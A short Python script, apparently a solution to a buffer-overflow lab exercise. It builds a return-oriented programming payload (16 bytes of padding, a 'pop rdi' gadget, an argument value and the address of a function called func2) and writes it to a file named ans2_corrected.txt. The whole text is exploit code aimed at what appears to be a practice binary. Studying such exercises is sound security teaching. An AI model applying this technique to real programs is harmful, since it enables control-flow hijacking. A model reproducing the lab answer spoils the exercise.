offset = 16

pop_rdi_addr = 0x4012c7  
func2_param = 0x3f8
func2_addr = 0x401216

padding = b'A' * offset
pop_rdi_gadget = pop_rdi_addr.to_bytes(8, 'little')
parameter = func2_param.to_bytes(8, 'little')
target_func = func2_addr.to_bytes(8, 'little')

payload = padding + pop_rdi_gadget + parameter + target_func

with open("ans2_corrected.txt", "wb") as f:
    f.write(payload)